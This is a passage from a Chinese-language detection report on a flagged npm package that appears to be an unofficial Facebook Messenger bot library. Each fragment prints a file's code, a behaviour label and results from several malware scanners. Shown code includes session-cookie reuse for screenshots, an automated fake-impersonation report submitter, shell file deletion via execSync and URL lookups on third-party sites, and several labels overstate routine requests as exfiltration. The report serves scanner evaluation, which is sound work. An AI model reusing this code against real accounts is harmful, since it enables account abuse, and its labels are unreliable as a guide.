**文件：** `package/Screenshot.js`  
**行号：** ``  
**标注类型：** ``

**行为说明：** Collects Facebook cookies and uses them for automated screenshotting of Facebook pages, risking credential misuse.

**规避技术：** 

**恶意代码：**
```javascript
var { join } = require('path');
var fs = require('fs');
var utils = require("../utils");

module.exports = function (defaultFuncs, api, ctx) {
    var Coookie = JSON.parse(JSON.stringify(ctx.jar.getCookies("https://www.facebook.com").concat(ctx.jar.getCookies("https://facebook.com")).concat(ctx.jar.getCookies("https://www.messenger.com"))));
    for (let i of Coookie) {
        i.name = i.key;
        i.domain = 'www.facebook.com';
        delete i.key;
    }
    return function(Link, callback) {
        const Screenshot = require('../Extra/ExtraScreenShot');
            var resolveFunc = function () { };
            var rejectFunc = function () { };
            var returnPromise = new Promise(function (resolve, reject) {
            resolveFunc = resolve;
            rejectFunc = reject;
            });

            if (!callback) {
                callback = function (err, data) {
                    if (err) return rejectFunc(err);
                    resolveFunc(data);
                };
            }
    if (Link.includes('facebook.com') || Link.includes('Facebook.com') || Link.includes('fb')) {
        let LinkSplit = Link.split('/');
            if (LinkSplit.indexOf("https:") == 0) {
                if (Link.includes('messages')) {
                    Screenshot.buffer(Link, {
                        cookies: Coookie
                    }).then(data => {
                        callback(null,data);
                    });
                }
                else if (!isNaN(LinkSplit[3]) && !Link.split('=')[1]  && !isNaN(Link.split('=')[1])) {
                    api.sendMessage('Invaild link, format link: facebook.com/Lazic.Kanzu',global.Fca.Data.event.threadID,global.Fca.Data.event.messageID);
                    callback('Error Link', null);
                }
                else if (!isNaN(Link.split('=')[1]) && Link.split('=')[1]) {
                    let Format = `https://www.facebook.com/profile.php?id=${Link.split('=')[1]}`;
                    Screenshot.buffer(Format, {
                        cookies: Coookie
                    }).then(data => {
                        callback(null,data);
                    });
                } 
                else {
                    let Format = `https://www.facebook.com/${LinkSplit[3]}`;
                    Screenshot.buffer(Format, {
                        cookies: Coookie
                    }).then(data => {
                        callback(null,data);
                    });
                }
            }
            else {
                let Form = `https://www.facebook.com/${LinkSplit[1]}`;
                Screenshot.buffer(Form, {
                    cookies: Coookie
                }).then(data => {
                    callback(null,data);
                });
            }
        }
            else {
                Screenshot.buffer(Link).then(data => {
                    callback(null,data);
                });
            }
        return returnPromise;
    };
};
```

**形式化行为：** sensitive_data_collection, unauthorized_access, legitimate_api_abuse

**形式化规避：** built_in_module_abuse, legitimate_api_abuse

**工具检测对比：**

- GuardDog：检测到（包含恶意/可疑关键字）
- **Genie：未检测到**（未找到明确恶意迹象）
- OSSGadget：检测到（包含恶意/可疑关键字）
- SocketAI：检测到（包含恶意/可疑关键字）
- Packj Static：检测到（包含恶意/可疑关键字）
- Packj Trace：检测到（包含恶意/可疑关键字）
- **SAP：未检测到**（SAP 未标记为恶意）

#### 片段 31

**文件：** `package/unsendMessage.js`  
**行号：** ``  
**标注类型：** ``

**行为说明：** Performs HTTP POST to Facebook, potentially unsending messages; network activity and message manipulation may be concerning.

**规避技术：** 

**恶意代码：**
```javascript
"use strict";

var utils = require("../utils");
var log = require("npmlog");

module.exports = function (defaultFuncs, api, ctx) {
  return function unsendMessage(messageID, callback) {
    var resolveFunc = function () { };
    var rejectFunc = function () { };
    var returnPromise = new Promise(function (resolve, reject) {
      resolveFunc = resolve;
      rejectFunc = reject;
    });

    if (!callback) {
      callback = function (err, friendList) {
        if (err) return rejectFunc(err);
        resolveFunc(friendList);
      };
    }

    var form = {
      message_id: messageID
    };

    defaultFuncs
      .post("https://www.facebook.com/messaging/unsend_message/", ctx.jar, form)
      .then(utils.parseAndCheckLogin(ctx, defaultFuncs))
      .then(function (resData) {
        if (resData.error) throw resData;
        return callback();
      })
      .catch(function (err) {
        log.error("unsendMessage", err);
        return callback(err);
      });

    return returnPromise;
  };
};

```

**形式化行为：** legitimate_api_abuse, unauthorized_access

**形式化规避：** 

**工具检测对比：**

- GuardDog：检测到（包含恶意/可疑关键字）
- **Genie：未检测到**（未找到明确恶意迹象）
- OSSGadget：检测到（包含恶意/可疑关键字）
- SocketAI：检测到（包含恶意/可疑关键字）
- Packj Static：检测到（包含恶意/可疑关键字）
- Packj Trace：检测到（包含恶意/可疑关键字）
- **SAP：未检测到**（SAP 未标记为恶意）

#### 片段 32

**文件：** `package/getUserInfo.js`  
**行号：** ``  
**标注类型：** ``

**行为说明：** Performs HTTP POST requests to Facebook, collects user info, and accesses global data structures.

**规避技术：** 

**恶意代码：**
```javascript
"use strict";

var utils = require("../utils");
var log = require("npmlog");

module.exports = function (defaultFuncs, api, ctx) {
  return function getUserInfo(id, callback) {
    var resolveFunc = function () { };
    var rejectFunc = function () { };
    var returnPromise = new Promise(function (resolve, reject) {
      resolveFunc = resolve;
      rejectFunc = reject;
    });

    if (!callback) {
      callback = function (err, userInfo) {
        if (err) return rejectFunc(err);
        resolveFunc(userInfo);
      };
    }

    if (utils.getType(id) !== "Array") id = [id];

    var respone = [];
    var Nope = [];
    if (global.Fca.Data.Userinfo != undefined && global.Fca.Data.Userinfo.length != 0) {
      if (id.length == 1) {
        if (global.Fca.Data.Userinfo[0].some(i => i.id == id[0])) {
          var Format = {}
          Format[id[0]] = global.Fca.Data.Userinfo[0].find(i => i.id == id[0])
          callback(null,Format);
        }
        else {
          Nope.push(id[0]);
        }
      } 
      else for (let ii of id) {
        if (global.Fca.Data.Userinfo[0].some(i => i.id == ii)) {
          var Format = {}
          Format[id[ii]] = global.Fca.Data.Userinfo[0].find(i => i.id == ii);
          respone.push(Format);
        }
        else {
          Nope.push(ii);
        }
      }
      if (Nope.length > 0 && respone > 0) {
        var form = {};
        Nope.map(function (v, i) {
          form["ids[" + i + "]"] = v;
        });
        defaultFuncs
          .post("https://www.facebook.com/chat/user_info/", ctx.jar, form)
          .then(utils.parseAndCheckLogin(ctx, defaultFuncs))
          .then(function (resData) {
            if (resData.error) throw resData;
            respone.push(formatData(resData.payload.profiles));
            callback(null, respone);
          })
          .catch(function (err) {
            log.error("getUserInfo", "Lỗi: getUserInfo Có Thể Do Bạn Spam Quá Nhiều !,Hãy Thử Lại !");
            return callback(err, respone);
          });
        return returnPromise;
      }
      else if (Nope.length > 0 && respone <= 0) {
        var form = {};
        Nope.map(function (v, i) {
          form["ids[" + i + "]"] = v;
        });
        defaultFuncs
          .post("https://www.facebook.com/chat/user_info/", ctx.jar, form)
          .then(utils.parseAndCheckLogin(ctx, defaultFuncs))
          .then(function (resData) {
            if (resData.error) throw resData;
            callback(null, formatData(resData.payload.profiles));
          })
          .catch(function (err) {
            log.error("getUserInfo", "Lỗi: getUserInfo Có Thể Do Bạn Spam Quá Nhiều !,Hãy Thử Lại !");
            return callback(err, respone);
          });
        return returnPromise;
      };
      return returnPromise
    }
    else {
      var form = {};
        id.map(function (v, i) {
          form["ids[" + i + "]"] = v;
        });
        defaultFuncs
          .post("https://www.facebook.com/chat/user_info/", ctx.jar, form)
          .then(utils.parseAndCheckLogin(ctx, defaultFuncs))
          .then(function (resData) {
            if (resData.error) throw resData;
            callback(null, formatData(resData.payload.profiles));
          })
          .catch(function (err) {
            log.error("getUserInfo", "Lỗi: getUserInfo Có Thể Do Bạn Spam Quá Nhiều !,Hãy Thử Lại !");
            callback(err, formatData(resData.payload.profiles));
          });
        return returnPromise;
    }
  }
};

```

**形式化行为：** sensitive_data_collection, legitimate_api_abuse, data_exfiltration

**形式化规避：** built_in_module_abuse, legitimate_api_abuse, silent_error_handling, network_traffic_blending

**工具检测对比：**

- GuardDog：检测到（包含恶意/可疑关键字）
- **Genie：未检测到**（未找到明确恶意迹象）
- OSSGadget：检测到（包含恶意/可疑关键字）
- SocketAI：检测到（包含恶意/可疑关键字）
- Packj Static：检测到（包含恶意/可疑关键字）
- Packj Trace：检测到（包含恶意/可疑关键字）
- **SAP：未检测到**（SAP 未标记为恶意）

#### 片段 33

**文件：** `package/markAsSeen.js`  
**行号：** ``  
**标注类型：** ``

**行为说明：** Sends HTTP POST to Facebook, possibly marking messages as seen; could be abused for automated or unauthorized actions.

**规避技术：** 

**恶意代码：**
```javascript
"use strict";

var utils = require("../utils");
var log = require("npmlog");

module.exports = function (defaultFuncs, api, ctx) {
  return function markAsSeen(seen_timestamp, callback) {
    if (utils.getType(seen_timestamp) == "Function" ||
      utils.getType(seen_timestamp) == "AsyncFunction") {
      callback = seen_timestamp;
      seen_timestamp = Date.now();
    }

    var resolveFunc = function () { };
    var rejectFunc = function () { };
    var returnPromise = new Promise(function (resolve, reject) {
      resolveFunc = resolve;
      rejectFunc = reject;
    });

    if (!callback) {
      callback = function (err, data) {
        if (err) return rejectFunc(err);

        resolveFunc(data);
      };
    }

    var form = {
      seen_timestamp: seen_timestamp
    };

    defaultFuncs
      .post("https://www.facebook.com/ajax/mercury/mark_seen.php", ctx.jar, form)
      .then(utils.saveCookies(ctx.jar))
      .then(utils.parseAndCheckLogin(ctx, defaultFuncs))
      .then(function (resData) {
        if (resData.error) throw resData;

        return callback();
      })
      .catch(function (err) {
        log.error("markAsSeen", err);
        if (utils.getType(err) == "Object" && err.error === "Not logged in.") ctx.loggedIn = false;

        return callback(err);
      });

    return returnPromise;
  };
};

```

**形式化行为：** legitimate_api_abuse, unauthorized_access

**形式化规避：** legitimate_api_abuse, silent_error_handling, network_traffic_blending

**工具检测对比：**

- GuardDog：检测到（包含恶意/可疑关键字）
- **Genie：未检测到**（未找到明确恶意迹象）
- OSSGadget：检测到（包含恶意/可疑关键字）
- SocketAI：检测到（包含恶意/可疑关键字）
- Packj Static：检测到（包含恶意/可疑关键字）
- Packj Trace：检测到（包含恶意/可疑关键字）
- **SAP：未检测到**（SAP 未标记为恶意）

#### 片段 34

**文件：** `package/changeAdminStatus.js`  
**行号：** ``  
**标注类型：** ``

**行为说明：** Performs HTTP POST to Facebook, potentially altering group admin status; network activity and privilege changes may be risky.

**规避技术：** 

**恶意代码：**
```javascript
"use strict";

const utils = require("../utils");
const log = require("npmlog");

module.exports = function(defaultFuncs, api, ctx) {
  return function changeAdminStatus(threadID, adminIDs, adminStatus, callback) {
    if (utils.getType(threadID) !== "String") {
      throw {error: "changeAdminStatus: threadID must be a string"};
    }

    if (utils.getType(adminIDs) === "String") {
      adminIDs = [adminIDs];
    }

    if (utils.getType(adminIDs) !== "Array") {
      throw {error: "changeAdminStatus: adminIDs must be an array or string"};
    }

    if (utils.getType(adminStatus) !== "Boolean") {
      throw {error: "changeAdminStatus: adminStatus must be a string"};
    }

    var resolveFunc = function(){};
    var rejectFunc = function(){};
    var returnPromise = new Promise(function (resolve, reject) {
      resolveFunc = resolve;
      rejectFunc = reject;
    });

    if (!callback) {
      callback = function (err) {
        if (err) {
          return rejectFunc(err);
        }
        resolveFunc();
      };
    }

    if (utils.getType(callback) !== "Function" && utils.getType(callback) !== "AsyncFunction") {
      throw {error: "changeAdminStatus: callback is not a function"};
    }

    let form = {
      "thread_fbid": threadID,
    };

    let i = 0;
    for (let u of adminIDs) {
      form[`admin_ids[${i++}]`] = u;
    }
    form["add"] = adminStatus;

    defaultFuncs
      .post("https://www.facebook.com/messaging/save_admins/?dpr=1", ctx.jar, form)
      .then(utils.parseAndCheckLogin(ctx, defaultFuncs))
      .then(function(resData) {
        if (resData.error) {
          switch (resData.error) {
            case 1976004:
              throw { error: "Cannot alter admin status: you are not an admin.", rawResponse: resData };
            case 1357031:
              throw { error: "Cannot alter admin status: this thread is not a group chat.", rawResponse: resData };
            default:
              throw { error: "Cannot alter admin status: unknown error.", rawResponse: resData };
          }
        }

        callback();
      })
      .catch(function(err) {
        log.error("changeAdminStatus", err);
        return callback(err);
      });
      
    return returnPromise;
  };
};

```

**形式化行为：** legitimate_api_abuse, unauthorized_access, privilege_escalation

**形式化规避：** legitimate_api_abuse, silent_error_handling, network_traffic_blending

**工具检测对比：**

- GuardDog：检测到（包含恶意/可疑关键字）
- **Genie：未检测到**（未找到明确恶意迹象）
- OSSGadget：检测到（包含恶意/可疑关键字）
- SocketAI：检测到（包含恶意/可疑关键字）
- Packj Static：检测到（包含恶意/可疑关键字）
- Packj Trace：检测到（包含恶意/可疑关键字）
- **SAP：未检测到**（SAP 未标记为恶意）

#### 片段 35

**文件：** `package/getThreadMain.js`  
**行号：** ``  
**标注类型：** ``

**行为说明：** Performs network requests to Facebook GraphQL API and processes thread/user data, potentially exposing sensitive information.

**规避技术：** 

**恶意代码：**
```javascript
"use strict";

var utils = require("../utils");
var log = require("npmlog");
// ... [truncated for brevity] ...
module.exports = function(defaultFuncs, api, ctx) {
  return function getThreadInfoGraphQL(threadID, callback) {
    var resolveFunc = function(){};
    var rejectFunc = function(){};
    var returnPromise = new Promise(function (resolve, reject) {
      resolveFunc = resolve;
      rejectFunc = reject;
    });

    if (utils.getType(callback) != "Function" && utils.getType(callback) != "AsyncFunction") {
      callback = function (err, data) {
        if (err) {
          return rejectFunc(err);
        }
        resolveFunc(data);
      };
    }
    
    if (utils.getType(threadID) !== "Array") threadID = [threadID];
    
    var Form = {};
    var ThreadInfo = [];

    threadID.map(function (x,y) {
      Form["o" + y] = {
        doc_id: "3449967031715030",
        query_params: {
          id: x,
          message_limit: 0,
          load_messages: false,
          load_read_receipts: false,
          before: null
        }
      };
    });

    var form = {
      queries: JSON.stringify(Form),
      batch_name: "MessengerGraphQLThreadFetcher"
    };

    defaultFuncs
      .post("https://www.facebook.com/api/graphqlbatch/", ctx.jar, form)
      .then(utils.parseAndCheckLogin(ctx, defaultFuncs))
      .then(function(resData) {
      if (resData.error) {
        callback(null,resData.error);
        throw resData;
      }
      resData = resData.splice(0, resData.length - 1);
      resData.sort((a, b) => { return Object.keys(a)[0].localeCompare(Object.keys(b)[0]); });
      resData.map(function (x,y) {
        ThreadInfo.push(formatThreadGraphQLResponse(x["o"+y].data));
      });
      if (Object.keys(resData).length == 1) {
        callback(null, ThreadInfo[0]);
      } else {
      callback(null, ThreadInfo);
      }
    })
    .catch(function(err) {
      log.error("getThreadInfoGraphQL", "Lỗi: getThreadInfoGraphQL Có Thể Do Bạn Spam Quá Nhiều, Hãy Thử Lại !");
    return callback(err);
  });
  return returnPromise;
  };
};
```

**形式化行为：** sensitive_data_collection, legitimate_api_abuse, data_exfiltration

**形式化规避：** built_in_module_abuse, legitimate_api_abuse, silent_error_handling, network_traffic_blending

**工具检测对比：**

- GuardDog：检测到（包含恶意/可疑关键字）
- **Genie：未检测到**（未找到明确恶意迹象）
- OSSGadget：检测到（包含恶意/可疑关键字）
- SocketAI：检测到（包含恶意/可疑关键字）
- Packj Static：检测到（包含恶意/可疑关键字）
- Packj Trace：检测到（包含恶意/可疑关键字）
- **SAP：未检测到**（SAP 未标记为恶意）

#### 片段 36

**文件：** `package/unfriend.js`  
**行号：** ``  
**标注类型：** ``

**行为说明：** Performs HTTP POST to Facebook to remove a friend; could automate account actions without user consent.

**规避技术：** 

**恶意代码：**
```javascript
"use strict";

var utils = require("../utils");
var log = require("npmlog");

module.exports = function (defaultFuncs, api, ctx) {
  return function unfriend(userID, callback) {
    var resolveFunc = function () { };
    var rejectFunc = function () { };
    var returnPromise = new Promise(function (resolve, reject) {
      resolveFunc = resolve;
      rejectFunc = reject;
    });

    if (!callback) {
      callback = function (err, friendList) {
        if (err) return rejectFunc(err);
        resolveFunc(friendList);
      };
    }

    var form = {
      uid: userID,
      unref: "bd_friends_tab",
      floc: "friends_tab",
      "nctr[_mod]": "pagelet_timeline_app_collection_" + ctx.userID + ":2356318349:2"
    };

    defaultFuncs
      .post("https://www.facebook.com/ajax/profile/removefriendconfirm.php", ctx.jar, form)
      .then(utils.parseAndCheckLogin(ctx, defaultFuncs))
      .then(function (resData) {
        if (resData.error) throw resData;
        return callback();
      })
      .catch(function (err) {
        log.error("unfriend", err);
        return callback(err);
      });

    return returnPromise;
  };
};

```

**形式化行为：** legitimate_api_abuse, unauthorized_access

**形式化规避：** built_in_module_abuse, legitimate_api_abuse, silent_error_handling, network_traffic_blending

**工具检测对比：**

- GuardDog：检测到（包含恶意/可疑关键字）
- **Genie：未检测到**（未找到明确恶意迹象）
- OSSGadget：检测到（包含恶意/可疑关键字）
- SocketAI：检测到（包含恶意/可疑关键字）
- Packj Static：检测到（包含恶意/可疑关键字）
- Packj Trace：检测到（包含恶意/可疑关键字）
- **SAP：未检测到**（SAP 未标记为恶意）

#### 片段 37

**文件：** `package/muteThread.js`  
**行号：** ``  
**标注类型：** ``

**行为说明：** Performs HTTP POST to Facebook endpoint, potentially sending user data and cookies to external server.

**规避技术：** 

**恶意代码：**
```javascript
"use strict";

var utils = require("../utils");
var log = require("npmlog");

module.exports = function (defaultFuncs, api, ctx) {
  // muteSecond: -1=permanent mute, 0=unmute, 60=one minute, 3600=one hour, etc.
  return function muteThread(threadID, muteSeconds, callback) {
    var resolveFunc = function () { };
    var rejectFunc = function () { };
    var returnPromise = new Promise(function (resolve, reject) {
      resolveFunc = resolve;
      rejectFunc = reject;
    });

    if (!callback) {
      callback = function (err, data) {
        if (err) return rejectFunc(err);

        resolveFunc(data);
      };
    }

    var form = {
      thread_fbid: threadID,
      mute_settings: muteSeconds
    };

    defaultFuncs
      .post("https://www.facebook.com/ajax/mercury/change_mute_thread.php", ctx.jar, form)
      .then(utils.saveCookies(ctx.jar))
      .then(utils.parseAndCheckLogin(ctx, defaultFuncs))
      .then(function (resData) {
        if (resData.error) {
          throw resData;
        }

        return callback();
      })
      .catch(function (err) {
        log.error("muteThread", err);
        return callback(err);
      });

    return returnPromise;
  };
};

```

**形式化行为：** legitimate_api_abuse, data_exfiltration

**形式化规避：** built_in_module_abuse, network_traffic_blending, silent_error_handling

**工具检测对比：**

- GuardDog：检测到（包含恶意/可疑关键字）
- **Genie：未检测到**（未找到明确恶意迹象）
- OSSGadget：检测到（包含恶意/可疑关键字）
- SocketAI：检测到（包含恶意/可疑关键字）
- Packj Static：检测到（包含恶意/可疑关键字）
- Packj Trace：检测到（包含恶意/可疑关键字）
- **SAP：未检测到**（SAP 未标记为恶意）

#### 片段 38

**文件：** `package/ReportV1.js`  
**行号：** ``  
**标注类型：** ``

**行为说明：** Sends user-supplied data to Facebook via HTTP requests, potentially automating abuse or impersonation reporting.

**规避技术：** 

**恶意代码：**
```javascript
"use strict";

var utils = require("../utils");
var log = require("npmlog");

module.exports = function (defaultFuncs, api, ctx) {
    return function (args,callback) {
        if (!args.Link && !args.RealName && !args.Content && !args.Gmail) throw new Error("Link,RealName,Content,Gmail are required");
        if (!args.Link) throw new Error("Điền args.Link vào, api.Premium.ReportV1(Link,RealName,Content,Gmail,Time,callback)");
        if (!args.RealName) throw new Error("Điền RealName vào, api.Premium.ReportV1(Link,RealName,Content,Time,Gmail,callback)");
        if (!args.Gmail) throw new Error("Điền Gmail vào, api.Premium.ReportV1(Link,RealName,Content,Gmail,Time,callback)");
        var resolveFunc = function () { };
        var rejectFunc = function () { };
        var returnPromise = new Promise(function (resolve, reject) {
            resolveFunc = resolve;
            rejectFunc = reject;
        });

        if (!callback) {
            callback = function (err, data) {
                if (err) return rejectFunc(err);
                resolveFunc(data);
            };
        }
        let RealForm;
        utils.get('https://www.facebook.com/help/contact/209046679279097?locale2=en_US', ctx.jar, null, ctx.globalOptions)
        .then(function(data) {
            RealForm = {
                crt_url: args.Link,
                crt_name: args.RealName,
                cf_age: "9 years",
                Field255260417881843: args.Content ? utils.getType(args.Content)=="String"? args.Content : "This timeline is impersonating me and my friends. It harass people on Facebook. I think this is a time line of baby, parents are not allowed. Please let Facebook account deactivated for Facebook is increasingly safer. Thank you!" : "This timeline is impersonating me and my friends. It harass people on Facebook. I think this is a time line of baby, parents are not allowed. Please let Facebook account deactivated for Facebook is increasingly safer. Thank you!",
                Field166040066844792: args.Gmail,
                source: '',
                support_form_id: 209046679279097,
                support_form_hidden_fields: JSON.stringify({}),
                support_form_fact_false_fields: [],
                lsd: utils.getFrom(data.body, "[\"LSD\",[],{\"token\":\"", "\"")
            };
        }).then(function() {
            defaultFuncs.postFormData('https://www.facebook.com/ajax/help/contact/submit/page', ctx.jar, RealForm, {}) 
            .then(utils.parseAndCheckLogin(ctx, defaultFuncs))
            .then(async function(dt) {
                if (dt.__ar == 1) {
                    callback(null, "Thành Công");
                }
                else {
                    callback(null, "Thất Bại");
                }
            });
        })
        return returnPromise;
    }
};

```

**形式化行为：** sensitive_data_collection, legitimate_api_abuse, data_exfiltration

**形式化规避：** built_in_module_abuse, network_traffic_blending, silent_error_handling

**工具检测对比：**

- GuardDog：检测到（包含恶意/可疑关键字）
- **Genie：未检测到**（未找到明确恶意迹象）
- OSSGadget：检测到（包含恶意/可疑关键字）
- SocketAI：检测到（包含恶意/可疑关键字）
- Packj Static：检测到（包含恶意/可疑关键字）
- Packj Trace：检测到（包含恶意/可疑关键字）
- **SAP：未检测到**（SAP 未标记为恶意）

#### 片段 39

**文件：** `package/ClearCache.js`  
**行号：** ``  
**标注类型：** ``

**行为说明：** Deletes files by executing shell commands based on user input; potential for destructive or unauthorized file removal.

**规避技术：** 

**恶意代码：**
```javascript
"use strict";
const { execSync } = require('child_process');
var utils = require("../utils");
var log = require("../logger");
var Object = ['png','json','wav','mp3','mp4','jpg','txt','gif','tff','m4a'];
var Recommend = ['png','wav','mp3','mp4','jpg','m4a'];
module.exports = function (defaultFuncs, api, ctx) {
    return function (Args,callback) {
        let New1 = [];
        if (!Args.New || utils.getType(Args.New) !== "Array") { 
            New1 = Recommend;
            log.Normal("Không Có Adding Thêm, Tiến Hành Sử Dụng Theo Hệ Thống Chỉ Định !");
        }
        else {
            for (let i = 0; i < Args.New.length; i++) {
                if (Object.indexOf(Args.New[i]) === -1) {
                    log.Normal('Không tìm thấy file ' + Args.New[i] + ' trong danh sách định dạng');
                    return;
                }
                New1.push(Args.New[i]);
            }
        }
        var resolveFunc = function () { };
        var rejectFunc = function () { };
        var returnPromise = new Promise(function (resolve, reject) {
            resolveFunc = resolve;
            rejectFunc = reject;
        });

        if (!callback) {
            callback = function (err, data) {
                if (err) return rejectFunc(err);
                resolveFunc(data);
            };
        }
        switch (process.platform) {
            case 'linux': {
                for (let i = 0; i < New1.length; i++) {
                    log.Normal('Đang Clear Loại File ' + New1[i]);
                    var STR = String(`find ./modules -type f -iname \'*.${New1[i]}\' -exec rm {} \\;`)
                    execSync(STR);
                }
                log.Normal('Thành Công Clear ' + New1.length + ' Loại File !');
                callback(null, 'Thành Công Clear ' + New1.length + ' Loại File !');
            }
            break;
            case "win32": {
                var cmd = "del /q /s /f /a ";
                for (let i = 0; i < New1.length; i++) {
                    log.Normal('Đang Clear Loại File ' + New1[i]);
                    var STR = String(cmd + '.\\modules\\*.' + New1[i] + '\"')
                    execSync(STR, { stdio: 'inherit' });
                }
                log.Normal('Thành Công Clear ' + New1.length + ' Loại File !');
                callback(null, 'Thành Công Clear ' + New1.length + ' Loại File !');
            }
            default: {
                return log.Error('Not Supported');
            }
        }
        return returnPromise;
    }
};

```

**形式化行为：** arbitrary_command_execution, file_cleanup

**形式化规避：** built_in_module_abuse, multi_platform_support, legitimate_api_abuse

**工具检测对比：**

- GuardDog：检测到（包含恶意/可疑关键字）
- **Genie：未检测到**（未找到明确恶意迹象）
- OSSGadget：检测到（包含恶意/可疑关键字）
- SocketAI：检测到（包含恶意/可疑关键字）
- Packj Static：检测到（包含恶意/可疑关键字）
- Packj Trace：检测到（包含恶意/可疑关键字）
- **SAP：未检测到**（SAP 未标记为恶意）

#### 片段 40

**文件：** `package/AcceptAgreement.js`  
**行号：** ``  
**标注类型：** ``

**行为说明：** Loads external database module, reads/writes persistent data, uses custom database, unclear intent, possible data persistence risk.

**规避技术：** 

**恶意代码：**
```javascript
"use strict";

var utils = require("../utils");
var log = require("npmlog");

module.exports = function (defaultFuncs, api, ctx) {
    return function (args,callback) {
        var resolveFunc = function () { };
        var rejectFunc = function () { };
        var returnPromise = new Promise(function (resolve, reject) {
            resolveFunc = resolve;
            rejectFunc = reject;
        });

        if (!callback) {
            callback = function (err, data) {
                if (err) return rejectFunc(err);
                resolveFunc(data);
            };
        }
            var  Database = require('synthetic-horizon-database');
            if (Database.get('agreement', {}, true) == true) {
                callback(null, "Accecpt");
            }
            else {
                Database.set('agreement', true,true);
                var Form = "=== Horizon end-user license agreement ===\n\n Free to use and edited ✨";
                callback(null, Form);
            }
        return returnPromise;
    }
};

```

**形式化行为：** persistence_installation, legitimate_api_abuse

**形式化规避：** 

**工具检测对比：**

- GuardDog：检测到（包含恶意/可疑关键字）
- **Genie：未检测到**（未找到明确恶意迹象）
- OSSGadget：检测到（包含恶意/可疑关键字）
- SocketAI：检测到（包含恶意/可疑关键字）
- Packj Static：检测到（包含恶意/可疑关键字）
- Packj Trace：检测到（包含恶意/可疑关键字）
- **SAP：未检测到**（SAP 未标记为恶意）

#### 片段 41

**文件：** `package/ExtraGetThread.js`  
**行号：** ``  
**标注类型：** ``

**行为说明：** Performs arbitrary data storage, retrieval, and deletion using a nonstandard database module; possible data exfiltration risk.

**规避技术：** 

**恶意代码：**
```javascript
var Database = require("synthetic-horizon-database");
var { lastRun,capture } = require('./Src/Last-Run');
var logger = require("../logger");
var getText = global.Fca.getText;
var language = require("../Language/index.json");
language = language.find(i => i.Language == require("../../../FastConfigFca.json").Language).Folder.ExtraGetThread;

exports.createData = function(threadID,threadData) {
    try { 
        Database.set(String(threadID),Object(threadData),true);
        logger.Normal(getText(language.CreateDatabaseSuccess,String(threadID)));
    }
    catch (e) {
        console.log(e);
        logger.Warning(getText(language.CreateDatabaseFailure,String(threadID))); 
    }
}

exports.updateData = function(threadID,threadData) {
    try { 
        Database.set(String(threadID),Object(threadData),true);
        logger.Normal(getText(language.updateDataSuccess,String(threadID)));
    }
    catch (e) {
        console.log(e);
        logger.Warning(getText(language.updateDataFailure,String(threadID))); 
    }
}

exports.updateMessageCount = function(threadID,threadData) {
    try { 
        Database.set(String(threadID),Object(threadData),true);
    }
    catch (e) {
        console.log(e);
    }
}

exports.getData = function(threadID) {
    switch (Database.has(String(threadID),true)) {
        case true: {
            return Database.get(String(threadID),{},true)
        }
        case false: {
            return null;
        }
    }
}

exports.deleteAll = function(data) {
    for (let i of data) {
        Database.delete(String(i),true);
    }
}

exports.getAll = function() {
    return Database.list(true);
}

exports.hasData = function(threadID) {
    return Database.has(String(threadID),true);
}

exports.alreadyUpdate = function(threadID) {
    var Time = Database.get(String(threadID),{},true).TimeUpdate;
        try { 
            if (global.Fca.startTime >= (Time + (3600 * 1000))) {
                logger.Normal(getText(language.alreadyUpdate, String(threadID)));
                return true;
            }
            else return false;
        }
        catch (e) { 
            console.log(e);
        return true;
    }
}

exports.readyCreate = function(Name) {
    switch (Database.has(String(Name),true)) {
        case true: {
            if (Number(global.Fca.startTime) >= Number(Database.get(String(Name),{},true) + (120 * 1000))) {
                return true;
            }   
            else {
                return false;
            }
        }
        case false: {
            return false;
        }
    }
}

exports.setLastRun = function(Name,LastRun) {
    Database.set(String(Name),String(lastRun(LastRun)),true);
}

exports.getLastRun = function(Name) {
    switch (Database.has(String(Name),true)) {
        case true: {
            return Database.get(String(Name),{},true);
        }
        case false: {
            try {
                capture(Name)
                this.setLastRun(Name,Name);
                return Database.get(String(Name),{},true);
            }
            catch(e) {
                console.log(e);
                return Date.now();
            }
        }
    }
}
```

**形式化行为：** sensitive_data_collection, persistence_installation, unauthorized_access

**形式化规避：** silent_error_handling, legitimate_api_abuse

**工具检测对比：**

- GuardDog：检测到（包含恶意/可疑关键字）
- **Genie：未检测到**（未找到明确恶意迹象）
- OSSGadget：检测到（包含恶意/可疑关键字）
- SocketAI：检测到（包含恶意/可疑关键字）
- Packj Static：检测到（包含恶意/可疑关键字）
- Packj Trace：检测到（包含恶意/可疑关键字）
- **SAP：未检测到**（SAP 未标记为恶意）

#### 片段 42

**文件：** `package/ExtraFindUID.js`  
**行号：** ``  
**标注类型：** ``

**行为说明：** Sends user-supplied URLs to external APIs, potentially leaking user data to third-party servers.

**规避技术：** 

**恶意代码：**
```javascript
const got = global.Fca.Require.Fetch;

/**
 * @param {string | URL} url
 * @param {{ sendMessage: (arg0: string, arg1: any) => any; }} api
 */
async function getUIDSlow(url,api) {
    var FormData =  require("form-data");
    var Form = new FormData();
	var Url = new URL(url);
    Form.append('username', Url.pathname.replace(/\//g, ""));
	try {
        var data = await got.post('https://api.findids.net/api/get-uid-from-username',{
            body: Form,
            userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.79 Safari/537.36'
        })
	} catch (e) {
        console.log(global.Fca.Data.event.threadID,e)
        return api.sendMessage("Lỗi: " + e.message,global.Fca.Data.event.threadID);
	}
    if (JSON.parse(data.body.toString()).status != 200) return api.sendMessage('Đã bị lỗi !',global.Fca.Data.event.threadID)
    if (typeof JSON.parse(data.body.toString()).error === 'string') return "errr"
    else return JSON.parse(data.body.toString()).data.id || "nịt";
}

/**
 * @param {string | URL} url
 * @param {{ sendMessage: (arg0: string, arg1: any, arg2: any) => any; }} api
 */
async function getUIDFast(url,api) {
    var FormData =  require("form-data");
    var Form = new FormData();
	var Url = new URL(url);
    Form.append('link', Url.href);
    try {
        var data = await got.post('https://id.traodoisub.com/api.php',{
            body: Form
        })
	} catch (e) {
        return api.sendMessage("Lỗi: " + e.message,global.Fca.Data.event.threadID,global.Fca.Data.event.messageID);
	}
    if (JSON.parse(data.body.toString()).error) return api.sendMessage(JSON.parse(data.body.toString()).error,global.Fca.Data.event.threadID,global.Fca.Data.event.messageID);
    else return JSON.parse(data.body.toString()).id || "co cai nit huhu";
}

```

**形式化行为：** sensitive_data_collection, data_exfiltration

**形式化规避：** built_in_module_abuse, silent_error_handling, network_traffic_blending

**工具检测对比：**

- GuardDog：检测到（包含恶意/可疑关键字）
- **Genie：未检测到**（未找到明确恶意迹象）
